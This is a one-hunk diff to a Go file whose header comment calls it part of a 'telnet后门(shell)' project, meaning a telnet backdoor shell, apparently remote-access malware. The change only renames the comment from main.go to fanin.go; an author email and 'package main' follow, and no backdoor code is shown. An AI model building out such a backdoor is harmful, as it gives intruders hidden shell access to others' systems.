@@ -1,4 +1,4 @@
-// telnet后门(shell) project main.go
+// telnet后门(shell) project fanin.go
 // 1871522910@qq.com
 package main
 
